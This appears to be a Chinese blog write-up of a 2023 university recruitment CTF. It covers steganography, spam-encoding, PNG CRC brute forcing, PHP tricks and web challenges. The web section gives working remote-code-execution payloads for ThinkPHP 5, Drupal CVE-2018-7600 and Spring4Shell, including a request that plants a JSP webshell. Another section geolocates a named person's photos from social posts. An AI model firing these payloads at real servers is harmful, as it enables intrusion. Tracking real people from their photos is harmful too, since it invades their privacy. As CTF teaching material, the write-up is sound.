---
title: 2023 Yulin Recruit Writeup
tags:
  - CTF
  - Writeup
catagories: CTF
mathjax: true
abbrlink: 8386
date: 2023-10-28 20:56:00
update: 2023-10-28 20:56:00
---

# [Baby]†签到†
很简单的信息搜索题，题干提到了塞尔达，猜想是塞尔达游戏中文字，搜索到塞尔达希卡文转换器，转换得到flag  
[希卡文转换器](https://kinglisky.github.io/zelda-words/)
# [Easy]♪绝♩对♫音♬感♪
听音乐发现什么也听不出来，用*WinHex*打开拖到最后发现一串Ascii码：
> The interval of each byte data is 9 and the first byte is at the beginning of the wav data  

告诉我们每个数据之间的间隔是9个字节，写一个脚本：
```python
import os

f=open(file="music.wav",mode="rb")
data=f.read()

wf=open(file="result.txt",mode="wb")

wfdata=bytes()

j=0
inter=9
for i in data:
    j+=1
    if j<15: continue
    if inter == 9:
        wfdata=wfdata+data[j-1].to_bytes(1,byteorder='little', signed=False)
        inter=0
    else: inter+=1

wf.write(wfdata)
print("done")
```
(写的太垃圾，跑了好久)  
跑出来发现开头是一封看不懂的垃圾邮件，下面是一整本三体小说
> Dear Friend ; Especially for you - this red-hot announcement 
! We will comply with all removal requests ! This mail 
is being sent in compliance with Senate bill 2116 ; 
Title 1 ; Section 303 ! This is NOT unsolicited bulk 
mail ! Why work for somebody else when you can become 
rich within 81 months . Have you ever noticed nearly 
every commercial on television has a .com on in it 
and nearly every commercial on television has a .com 
on in it . Well, now is your chance to capitalize on 
this ! We will help you deliver goods right to the 
customer's doorstep and use credit cards on your website 
! You can begin at absolutely no cost to you . But 
don't believe us . Ms Ames who resides in New Jersey 
tried us and says "Now I'm rich many more things are 
possible" ! This offer is 100% legal . So make yourself 
rich now by ordering immediately ! Sign up a friend 
and you get half off . Thanks ! Dear Salaryman ; Especially 
for you - this amazing intelligence ! If you are not 
interested in our publications and wish to be removed 
from our lists, simply do NOT respond and ignore this 
mail . This mail is being sent in compliance with Senate 
bill 2716 , Title 3 , Section 303 ! This is different 
than anything else you've seen . Why work for somebody 
else when you can become rich within 87 days . Have 
you ever noticed most everyone has a cellphone and 
society seems to be moving faster and faster . Well, 
now is your chance to capitalize on this ! WE will 
help YOU use credit cards on your website & turn your 
business into an E-BUSINESS . You can begin at absolutely 
no cost to you ! But don't believe us ! Mr Ames of 
Colorado tried us and says "I've been poor and I've 
been rich - rich is better" ! We are licensed to operate 
in all states . Do not delay - order today ! Sign up 
a friend and you'll get a discount of 50% . Thank-you 
for your serious consideration of our offer . 

不知道是干嘛的，搜了一下才知道是垃圾邮件编码...  
[spamdecode](https://www.spammimic.com/decode.cgi)  
解密即可
# [Mid-]马赛克星球
emm只做出来第一问  
是个简单的CRC爆破，附上脚本代码
```python
import zlib
import struct
import argparse
import itertools


parser = argparse.ArgumentParser()
parser.add_argument("-f", type=str, default=None, required=True,
                    help="输入同级目录下图片的名称")
args  = parser.parse_args()


bin_data = open(args.f, 'rb').read()
crc32key = zlib.crc32(bin_data[12:29]) # 计算crc
original_crc32 = int(bin_data[29:33].hex(), 16) # 原始crc


if crc32key == original_crc32: # 计算crc对比原始crc
    print('宽高没有问题!')
else:
    input_ = input("宽高被改了, 是否CRC爆破宽高? (Y/n):")
    if input_ not in ["Y", "y", ""]:
        exit()
    else: 
        for i, j in itertools.product(range(10000), range(10000)):
            data = bin_data[12:16] + struct.pack('>i', i) + struct.pack('>i', j) + bin_data[24:29]
            crc32 = zlib.crc32(data)
            if(crc32 == original_crc32):
                print(f"\nCRC32: {hex(original_crc32)}")
                print(f"宽度: {i}, hex: {hex(i)}")
                print(f"高度: {j}, hex: {hex(j)}")
                exit(0)

```
# [Easy]盒武器
最喜欢的开盒环节  
第一张照片简单的识图就可以找到是武汉理工大学南湖校区的建筑物，网上很多信息说它是图书馆，然而并不是，建议全景仔细看看...  
第二张照片是一座巨大的桥，而且可以看到桥上有国旗，判断应该就是国庆期间拍的。打开***Suzuran***的空间，发现他国庆期间去了武汉，那这个应该就是武汉长江大桥没跑了。观察拍摄点周围有树，判断应该是公园，打开地图，武汉长江大桥附近有个龟山风景区，就是这个了。  
至于时间，发现***Suzuran***在**10月5日**发了两条说说，一条是在江边，一条是在桥上，猜测该照片在10月5日拍摄，然后穷举时间...
# [Baby]babyphp
第一问是简单的php弱比较，由于哈希函数对于数组类型的参数返回都为0，因此可以考虑构造数组绕过，即`a[]=1&b[]=2`  
对于第二问，查询资料可知，md5是存在强碰撞的，即就是两个不同的数据算出来的md5值有可能相等。找到相关工具*fastcoll*之后，使用其对**cat /flag2**进行强碰撞，然后编码提交  
# [Baby]babyunserialize
因为实在没想到第二问怎么做，所以只水了第一问...  
简单构造所需的类即可
# [EASY]Script Kiddie
简单的信息搜集题  
第一个直接搜索ThinkPHP V5就搜到漏洞了，payload为
```
http://121.5.35.176:30002//index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
```
第二个打开发现是drupal框架，搜索相关漏洞，找到远程代码执行漏洞CVE-2018-7600  
根据相关教程提交post请求：
```
POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1
Host: 121.5.35.176:30003
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 107

form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=whoami
```
最后一个为spring框架，在cve官网搜索相关漏洞，注意到CVE-2022-22965这个远程代码执行漏洞，搜索后发现即是本题  
首先发送get请求更改日志：  
```
GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1
Host: 121.5.35.176:30004
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) 	AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 		Safari/537.36
Connection: close
suffix: %>//
c1: Runtime
c2: <%
DNT: 1
```
然后访问链接实现rce：  
```
http://121.5.35.176:30004/tomcatwar.jsp?pwd=j&cmd=whoami
```
参考链接：  
[攻防世界 ThinkPHP V5（漏洞解析及利用）](https://blog.csdn.net/qq_45676913/article/details/105467321)  
[Drupal 漏洞 CVE-2018-7600 远程代码执行-复现](https://blog.csdn.net/weixin_42742658/article/details/112479848)  
[CVE-2022-22965：Spring远程代码执行漏洞](https://blog.csdn.net/laobanjiull/article/details/124054250)
# [Baby]RseaE(季末大酬宾)
内网渗透入门题，每一道题的漏洞都已经写在题干上了  
题目给了一台可以连通外网和内网的主机，用scp上传fscan扫描得到四个ip
```
10.0.20.111:22 open
10.0.20.1:22 open
10.0.20.121:80 open
10.0.20.199:80 open
10.0.20.167:80 open
10.0.20.156:80 open
10.0.20.199:443 open
[*] WebTitle:http://10.0.20.156        code:200 len:120    title:Hello
[*] WebTitle:http://10.0.20.121        code:302 len:0      title:None 跳转url: http://10.0.20.121/solr/
[*] WebTitle:http://10.0.20.199        code:200 len:96     title:Hello
[*] WebTitle:http://10.0.20.121/solr/  code:200 len:13138  title:Solr Admin
[*] WebTitle:http://10.0.20.167        code:200 len:228    title:Struct-2.5.16-Demo
[*] WebTitle:https://10.0.20.199       code:200 len:96     title:Hello
[+] http://10.0.20.121 poc-yaml-solr-velocity-template-rce 
```
接下来就是快乐的脚本小子时间  
[CVE-2019-17558](https://www.cnblogs.com/Found404/p/14302902.html)  
[CVE-2014-6271](https://www.cnblogs.com/Cl0ud/p/14248937.html)  
[CVE-2019-0230](https://blog.csdn.net/weixin_42019588/article/details/113243932)  
[CVE-2014-0160](https://www.freebuf.com/column/194171.html)  
别忘了使用ssh内网穿透在本地机攻击  
```
ssh -L [local port]:[intranet ip]:[intranet port] [user]@[remote ip] -p [remote port]
```